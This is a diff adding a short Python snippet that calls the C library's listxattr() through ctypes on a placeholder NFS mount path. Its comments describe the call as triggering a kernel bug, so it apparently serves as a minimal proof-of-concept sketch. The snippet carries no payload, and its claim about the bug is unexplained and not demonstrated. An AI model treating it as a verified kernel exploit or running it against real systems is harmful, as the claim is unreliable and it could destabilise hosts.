@@ -1,0 +1,13 @@
+```python
+import ctypes
+
+# Assume the following variables are defined appropriately
+buffer_size = 16  # Size greater than 0
+buffer = ctypes.create_string_buffer(buffer_size)
+
+# Call to listxattr() that triggers the vulnerability
+result = ctypes.CDLL('libc.so.6').listxattr('/path/to/nfs/mount', buffer, buffer_size)
+
+# The result would be the size needed for the buffer, which can lead to the kernel bug
+print("Result:", result)
+```
